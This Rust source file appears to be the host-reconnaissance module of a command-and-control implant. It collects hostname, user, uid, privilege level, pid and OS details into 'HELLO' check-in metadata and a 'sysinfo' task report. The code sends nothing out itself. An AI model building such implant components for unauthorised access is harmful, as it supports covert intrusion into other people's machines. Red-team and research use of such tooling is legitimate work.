//! Host reconnaissance reported in the HELLO metadata.

use crate::upk::{self, Value};

pub fn hostname() -> String {
    for var in ["COMPUTERNAME", "HOSTNAME"] {
        if let Ok(v) = std::env::var(var) {
            if !v.is_empty() {
                return v;
            }
        }
    }
    if let Ok(v) = std::fs::read_to_string("/etc/hostname") {
        let t = v.trim();
        if !t.is_empty() {
            return t.to_string();
        }
    }
    "unknown".to_string()
}

pub fn username() -> String {
    for var in ["USER", "USERNAME", "LOGNAME"] {
        if let Ok(v) = std::env::var(var) {
            if !v.is_empty() {
                return v;
            }
        }
    }
    "unknown".to_string()
}

/// Unix effective uid (used as a crude privilege indicator).
#[cfg(unix)]
pub fn euid() -> Option<u32> {
    let status = std::fs::read_to_string("/proc/self/status").ok()?;
    for line in status.lines() {
        if let Some(rest) = line.strip_prefix("Uid:") {
            let mut parts = rest.split_whitespace();
            let _real = parts.next()?;
            let effective = parts.next()?;
            return effective.parse::<u32>().ok();
        }
    }
    None
}

#[cfg(not(unix))]
pub fn euid() -> Option<u32> {
    None
}

/// True when the process appears to run with elevated privileges.
pub fn is_elevated() -> bool {
    if let Some(uid) = euid() {
        return uid == 0;
    }
    false
}

pub fn integrity() -> String {
    match euid() {
        Some(0) => "system".to_string(),
        Some(uid) => format!("uid={uid}"),
        None => {
            if is_elevated() {
                "high".to_string()
            } else {
                "medium".to_string()
            }
        }
    }
}

/// HELLO metadata map.
pub fn meta(version: &str) -> Value {
    upk::map(vec![
        ("host", upk::s(&hostname())),
        ("os", upk::s(std::env::consts::OS)),
        ("arch", upk::s(std::env::consts::ARCH)),
        ("user", upk::s(&username())),
        ("pid", upk::i(std::process::id() as i64)),
        ("integ", upk::s(&integrity())),
        ("ver", upk::s(version)),
        ("family", upk::s(std::env::consts::FAMILY)),
    ])
}

/// Human readable report for the `sysinfo` task.
pub fn report() -> String {
    let mut out = String::new();
    out.push_str(&format!("host      : {}\n", hostname()));
    out.push_str(&format!("user      : {}\n", username()));
    out.push_str(&format!("os        : {}\n", std::env::consts::OS));
    out.push_str(&format!("family    : {}\n", std::env::consts::FAMILY));
    out.push_str(&format!("arch      : {}\n", std::env::consts::ARCH));
    out.push_str(&format!("pid       : {}\n", std::process::id()));
    out.push_str(&format!("integrity : {}\n", integrity()));
    out.push_str(&format!("cwd       : {}\n", std::env::current_dir().map(|p| p.display().to_string()).unwrap_or_else(|_| "?".into())));
    out
}
